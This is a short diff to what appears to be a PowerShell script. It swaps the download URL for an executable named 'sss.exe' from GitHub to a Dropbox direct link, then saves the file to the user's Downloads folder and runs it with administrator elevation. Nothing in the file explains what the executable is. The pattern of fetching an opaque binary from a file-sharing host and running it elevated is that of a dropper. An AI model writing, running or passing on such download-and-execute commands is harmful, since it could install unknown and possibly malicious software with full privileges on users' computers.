@@ -1,3 +1,3 @@
-Invoke-WebRequest -Uri "https://github.com/mo1sss/sss/blob/main/sss.exe" -OutFile "$env:USERPROFILE\Downloads\sss.exe"
+Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/2idkbo5sf67k6j2t6vlu2/sss.exe?rlkey=cjwmhileubxma3p41x1buhwxv&st=dcf7g4k4&dl=1" -OutFile "$env:USERPROFILE\Downloads\sss.exe"
 Start-Process -FilePath "$env:USERPROFILE\Downloads\sss.exe" -Verb RunAs
 
